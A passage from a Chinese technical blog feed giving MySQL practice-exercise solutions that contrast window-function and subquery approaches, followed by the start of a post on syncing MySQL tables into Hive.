class="hljs-string">'2025-10-15'</span><span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id<span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div><ul><li>旧写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id) a<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">num</span> &gt;=<span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id<span class="hljs-comment">-- #写法二：</span><span class="hljs-comment">-- SELECT DISTINCT user_id FROM order_info</span><span class="hljs-comment">-- WHERE user_id IN (</span><span class="hljs-comment">--     SELECT user_id FROM order_info</span><span class="hljs-comment">--     WHERE status = 'completed' </span><span class="hljs-comment">--     AND product_name IN ('C++','Java','Python')</span><span class="hljs-comment">--     AND date &gt; '2025-10-15'</span><span class="hljs-comment">--     GROUP BY user_id</span><span class="hljs-comment">--     HAVING COUNT(*) &gt;= 2</span><span class="hljs-comment">-- )</span><span class="hljs-comment">-- ORDER BY user_id</span></code></pre></div><h4 id="79"><a href="#79" class="headerlink" title="79"></a>79</h4><ul><li>新的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,user_id,product_name,<span class="hljs-keyword">status</span>,client_id,<span class="hljs-built_in">date</span><span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> *,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id) <span class="hljs-keyword">AS</span> cnt    <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>) t<span class="hljs-keyword">WHERE</span> cnt &gt;=<span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div><ul><li>旧的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">WHERE</span> user_id <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    <span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">2</span>    )<span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span><span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span></code></pre></div><h4 id="80"><a href="#80" class="headerlink" title="80"></a>80</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>),<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span><span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id<span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div><h4 id="81"><a href="#81" class="headerlink" title="81"></a>81</h4><ul><li>新的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span>     user_id,    <span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">CASE</span> rn <span class="hljs-keyword">WHEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">THEN</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">END</span>)),    <span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">CASE</span> rn <span class="hljs-keyword">WHEN</span> <span class="hljs-number">2</span> <span class="hljs-keyword">THEN</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">END</span>)),    <span class="hljs-keyword">COUNT</span>(*)<span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span>         user_id,        <span class="hljs-built_in">date</span>,        ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>) <span class="hljs-keyword">AS</span> rn    <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>    <span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)) t<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id<span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;=<span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div><ul><li>旧的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> order_info.user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(order_info.date)),b.date,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,user_id,<span class="hljs-built_in">date</span>,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>) <span class="hljs-keyword">AS</span> rs <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>    ) a    <span class="hljs-keyword">WHERE</span> rs = <span class="hljs-number">2</span>    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id) b <span class="hljs-keyword">ON</span> order_info.user_id = b.user_id<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> order_info.product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">AND</span> order_info.date &gt; <span class="hljs-string">'2025-10-15'</span><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> order_info.user_id<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> order_info.user_id</code></pre></div><h4 id="82"><a href="#82" class="headerlink" title="82"></a>82</h4><ul><li>新的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span>     t1.id,    is_group_buy,    <span class="hljs-keyword">IF</span>(is_group_buy = <span class="hljs-string">'NO'</span>,t2.name,<span class="hljs-literal">NULL</span>)<span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> *,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id) <span class="hljs-keyword">AS</span> cnt    <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>) t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">client</span>) t2<span class="hljs-keyword">ON</span> t1.client_id = t2.id<span class="hljs-keyword">WHERE</span> cnt &gt;=<span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div><ul><li>旧的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> order_info.id,order_info.is_group_buy,client.name <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">client</span> <span class="hljs-keyword">ON</span> order_info.client_id = client.id<span class="hljs-keyword">WHERE</span> user_id <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-12'</span>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    <span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;=<span class="hljs-number">2</span>)<span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-12'</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> order_info.id</code></pre></div><h4 id="83"><a href="#83" class="headerlink" title="83"></a>83</h4><ul><li>新的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span>     <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">name</span> <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span>,<span class="hljs-string">'GroupBuy'</span>,<span class="hljs-keyword">name</span>) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">source</span>,    cnt <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> *     <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span>             *,            <span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> client_id) <span class="hljs-keyword">AS</span> cnt,            <span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id) <span class="hljs-keyword">AS</span> user_num        <span class="hljs-keyword">FROM</span> order_info        <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>        <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)        <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>        ) t0     <span class="hljs-keyword">WHERE</span> user_num &gt;= <span class="hljs-number">2</span>) t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">client</span>) t2<span class="hljs-keyword">ON</span> t1.client_id = t2.id<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t1.client_id<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">name</span> <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span>,<span class="hljs-string">'GroupBuy'</span>,<span class="hljs-keyword">name</span>)</code></pre></div><ul><li>旧的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IFNULL</span>(client.name,<span class="hljs-string">'GroupBuy'</span>) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">source</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> cnt<span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-keyword">IN</span> (        <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> order_info        <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>        <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)        <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id        <span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">2</span>    )    <span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>    ) a<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">client</span> <span class="hljs-keyword">ON</span> a.client_id = client.id<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> client.name<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">source</span></code></pre></div><h4 id="84"><a href="#84" class="headerlink" title="84"></a>84</h4><ul><li>新写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">num</span>) <span class="hljs-keyword">AS</span> cnt <span class="hljs-keyword">FROM</span> resume_info<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">SUBSTR</span>(<span class="hljs-built_in">date</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>) = <span class="hljs-string">'2025'</span><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> cnt <span class="hljs-keyword">DESC</span></code></pre></div><ul><li>旧写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">num</span>) <span class="hljs-keyword">AS</span> cnt <span class="hljs-keyword">FROM</span> resume_info<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">YEAR</span>(<span class="hljs-built_in">date</span>) = <span class="hljs-string">'2025'</span><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> cnt <span class="hljs-keyword">DESC</span></code></pre></div><h4 id="85"><a href="#85" class="headerlink" title="85"></a>85</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y-%m'</span>) <span class="hljs-keyword">AS</span> mon,<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">num</span>) <span class="hljs-keyword">AS</span> cnt<span class="hljs-keyword">FROM</span> resume_info<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">SUBSTR</span>(<span class="hljs-built_in">date</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>) = <span class="hljs-string">'2025'</span><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job,mon<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> mon <span class="hljs-keyword">DESC</span>,cnt <span class="hljs-keyword">DESC</span></code></pre></div><h4 id="86"><a href="#86" class="headerlink" title="86"></a>86</h4><ul><li>旧写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.job,t1.mon,t1.cnt,t2.mon,t2.cnt<span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y-%m'</span>) <span class="hljs-keyword">AS</span> mon,<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">num</span>) <span class="hljs-keyword">AS</span> cnt    <span class="hljs-keyword">FROM</span> resume_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y'</span>) = <span class="hljs-number">2025</span>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job,mon    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> mon <span class="hljs-keyword">DESC</span>,cnt <span class="hljs-keyword">DESC</span>) t1,(    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y-%m'</span>) <span class="hljs-keyword">AS</span> mon,<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">num</span>) <span class="hljs-keyword">AS</span> cnt    <span class="hljs-keyword">FROM</span> resume_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y'</span>) = <span class="hljs-number">2026</span>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job,mon    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> mon <span class="hljs-keyword">DESC</span>,cnt <span class="hljs-keyword">DESC</span>) t2<span class="hljs-keyword">WHERE</span> t1.job =t2.job<span class="hljs-keyword">AND</span> <span class="hljs-keyword">SUBSTR</span>(t1.mon,<span class="hljs-number">-2</span>) = <span class="hljs-keyword">SUBSTR</span>(t2.mon,<span class="hljs-number">-2</span>)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t1.mon <span class="hljs-keyword">DESC</span>,job <span class="hljs-keyword">DESC</span></code></pre></div><h4 id="87"><a href="#87" class="headerlink" title="87"></a>87</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> grade,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade) <span class="hljs-keyword">FROM</span> class_grade</code></pre></div><h4 id="86-1"><a href="#86-1" class="headerlink" title="86"></a>86</h4><ul><li>新写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> grade <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span>          grade,        <span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade) <span class="hljs-keyword">AS</span> rn1,        <span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rn2,        (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">FROM</span> class_grade) <span class="hljs-keyword">AS</span> cnt    <span class="hljs-keyword">FROM</span> class_grade) t<span class="hljs-keyword">WHERE</span> t.rn1 &gt;= cnt/<span class="hljs-number">2</span><span class="hljs-keyword">AND</span> t.rn2 &gt;= cnt/<span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade</code></pre></div><ul><li>旧写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> grade <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span>  grade,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade) <span class="hljs-keyword">AS</span> rs1,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rs2    <span class="hljs-keyword">FROM</span> class_grade    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span>  grade) t<span class="hljs-keyword">WHERE</span> t.rs1 &gt;= (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">FROM</span> class_grade)/<span class="hljs-number">2</span><span class="hljs-keyword">AND</span> t.rs2 &gt;= (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">FROM</span> class_grade)/<span class="hljs-number">2</span></code></pre></div><h4 id="89"><a href="#89" class="headerlink" title="89"></a>89</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>,grade_sum <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>,<span class="hljs-keyword">SUM</span>(grade_num) <span class="hljs-keyword">AS</span> grade_sum <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>    <span class="hljs-keyword">JOIN</span> grade_info    <span class="hljs-keyword">ON</span> user.id = grade_info.user_id    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">name</span>) t<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade_sum <span class="hljs-keyword">DESC</span><span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre></div><h4 id="90"><a href="#90" class="headerlink" title="90"></a>90</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user.id,user.name,grade_sum<span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> *,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade_sum <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rs     <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">SUM</span>(grade_num) <span class="hljs-keyword">AS</span> grade_sum <span class="hljs-keyword">FROM</span> grade_info        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    ) t1) t2<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span><span class="hljs-keyword">ON</span> user.id = b.user_id<span class="hljs-keyword">WHERE</span> rs = <span class="hljs-number">1</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user.id</code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据仓库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hive同步业务库MySQL表方案</title>
      <link href="/2021/10/04/Hive%E5%90%8C%E6%AD%A5%E4%B8%9A%E5%8A%A1%E5%BA%93MySQL%E8%A1%A8%E6%96%B9%E6%A1%88/"/>
      <url>/2021/10/04/Hive%E5%90%8C%E6%AD%A5%E4%B8%9A%E5%8A%A1%E5%BA%93MySQL%E8%A1%A8%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>一些常见的Hive同步业务库MySQL（MySQL数据导入到Hive表）的操作</p><a id="more"></a><p>Hive表数据同步（数据采集）业务库MySQL表的步骤：</p><ol><li>找到MySQL表，查看表结构或建表语句</li><li>创建Hive表</li><li>创建调度作业</li><li>触发调度调度，核对数据</li></ol><p>具体来看看常见的<strong>全量同步</strong>和<strong>增量同步</strong>两种方式</p><h2 id="全量同步采集"><a href="#全量同步采集" class="headerlink" title="全量同步采集"></a>全量同步采集</h2><p>我们以天表为例（也有小时表，但都一样的）</p><ol><li><p>找到mysql建表语句</p><p>我们假设建表语句如下，这里只有三个字段</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`mysql_store_gmv`</span> (  <span class="hljs-string">`dt`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">25</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'日期'</span>,  <span class="hljs-string">`store_id`</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'店铺ID'</span>,   <span class="hljs-string">`gmv`</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'该店铺当天成交金额总和'</span>  